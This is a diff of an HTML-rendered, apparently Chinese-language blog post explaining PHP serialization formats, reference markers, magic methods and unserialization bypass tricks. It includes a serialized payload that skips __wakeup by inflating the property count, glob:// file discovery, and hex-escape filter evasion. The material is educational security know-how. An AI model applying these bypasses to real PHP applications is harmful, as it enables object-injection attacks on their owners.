+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;SampleClass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;SampleClass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果是： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SampleClass&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;SampleClass&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// after re-value
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;SampleClass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;value&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们可以从源码中看出区别就在于 &lt;code&gt;&#39;&amp;amp;&#39;&lt;/code&gt; &lt;!-- raw HTML omitted --&gt;
+特别是在经过重新赋值之后： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;$a-&amp;gt;value变成了int(1) &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;而$b整一个对象直接变成了int(1) &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;原因就是‘&amp;amp;’进行指针引用后，使$b-&amp;gt;value 与$b本身进行绑定，其中一个的改变也会影响另一个 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;引用标识之后的数字&lt;/p&gt;
+&lt;p&gt;对象引用（r）和指针引用（R）的格式为： &lt;!-- raw HTML omitted --&gt;
+r:&amp;lt;number&amp;gt;; &lt;!-- raw HTML omitted --&gt;
+R:&amp;lt;number&amp;gt;; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&amp;lt;number&amp;gt;表示的就是，当前这个引用，所引用的对象，在序列化字节流中，是第几个出现的（包括其中复合型成员的子成员） &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;我们通过一个例子来讲解一下： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;ClassA&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$obj&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$pr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ClassA&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Hello&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;bool&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;obj&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;pr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;结果是： &lt;!-- raw HTML omitted --&gt;
+O:6:&amp;ldquo;ClassA&amp;rdquo;:5:{s:3:&amp;ldquo;int&amp;rdquo;;i:1;s:3:&amp;ldquo;str&amp;rdquo;;s:5:&amp;ldquo;Hello&amp;rdquo;;s:4:&amp;ldquo;bool&amp;rdquo;;b:0;s:3:&amp;ldquo;obj&amp;rdquo;;r:1;s:2:&amp;ldquo;pr&amp;rdquo;;R:3;} &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;我们先来看结果： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;$a-&amp;gt;pr序列化后的结果为 &lt;code&gt;&#39;R:3;&#39;&lt;/code&gt; 表示引用了第三个出现的成员 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;那么在这个序列化字节流中，第一个成员是ClassA对象，第二个就是对象中的子成员 $a-&amp;gt;int，第三个就是 &lt;code&gt;$a-&amp;gt;str&lt;/code&gt; 也就是我们这里所进行引用的对象，也就会被标记为 &lt;code&gt;&#39;R:3;&#39;&lt;/code&gt;  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;unserialize-反序列化&#34;&gt;Unserialize 反序列化&lt;/h3&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Test&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;This A&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
@@ -1004,8 +1147,8 @@ private属性被序列化的时候属性值会变成 &lt;code&gt;%00类名%00属
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;#当一个对象没有后续被引用时，被调用（注意说销毁并不准确），当一个对象的
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__toString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;#当一个对象被当作一个字符串使用时被调用
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__invoke&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;#当脚本尝试将对象调用为函数时触发
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;#serialize()时会自动调用
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;#unserialize()时会自动调用
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__sleep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;       &lt;span class=&#34;c1&#34;&gt;#serialize()时会自动调用   
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__wakeup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;      &lt;span class=&#34;c1&#34;&gt;#unserialize()时会自动调用   
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;#当调用对象中不存在的方法会自动调用该方法。
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;#在调用私有属性的时候会自动执行
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;__set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;         &lt;span class=&#34;c1&#34;&gt;#用于将数据写入不可访问的属性（根据Access modifilers来判断,e.g., protected, private）
@@ -1224,7 +1367,8 @@ private属性被序列化的时候属性值会变成 &lt;code&gt;%00类名%00属
 &lt;li&gt;
 &lt;p&gt;__wakeup()&lt;/p&gt;
 &lt;p&gt;在反序列化字符串时，如果一个对象申明的属性个数大于实际个数时，就会自动跳过 __wakeup() 的执行 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;p&gt;例如 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;（此方法只适用于PHP5 &amp;lt; 5.6.25, PHP7 &amp;lt; 7.0.10） &lt;!-- raw HTML omitted --&gt;
+例如 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;O:4:&amp;ldquo;Name&amp;rdquo;:2:{s:14:&amp;ldquo;�Name�username&amp;rdquo;;s:5:&amp;ldquo;admin&amp;rdquo;;s:14:&amp;ldquo;�Name�password&amp;rdquo;;i:100;} &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;👇 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;O:4:&amp;ldquo;Name&amp;rdquo;:3:{s:14:&amp;ldquo;�Name�username&amp;rdquo;;s:5:&amp;ldquo;admin&amp;rdquo;;s:14:&amp;ldquo;�Name�password&amp;rdquo;;i:100;} &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
@@ -1233,12 +1377,27 @@ private属性被序列化的时候属性值会变成 &lt;code&gt;%00类名%00属
 &lt;/ul&gt;
 &lt;h4 id=&#34;配合php伪协议&#34;&gt;配合PHP伪协议&lt;/h4&gt;
 &lt;p&gt;使用 &lt;code&gt;glob://&lt;/code&gt; 伪协议来查找特定的文件路径（同时可以配合测信道攻击使用） &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;h4 id=&#34;序列化&#34;&gt;序列化&lt;/h4&gt;
-&lt;p&gt;通过将字符串标识符 &lt;code&gt;s&lt;/code&gt; 修改成 &lt;code&gt;S&lt;/code&gt; 便可以解释十六进制字符，从而进行绕过 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;h4 id=&#34;属性赋值&#34;&gt;属性赋值&lt;/h4&gt;
+&lt;h4 id=&#34;序列化成员绕过&#34;&gt;序列化成员绕过&lt;/h4&gt;
+&lt;!-- raw HTML omitted --&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;字符串绕过&lt;/p&gt;
+&lt;p&gt;通过将字符串标识符 &lt;code&gt;s&lt;/code&gt; 修改成 &lt;code&gt;S&lt;/code&gt; 便可以解释十六进制字符，进而将被过滤的字符串使用ASCII替换，从而进行绕过 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;/li&gt;
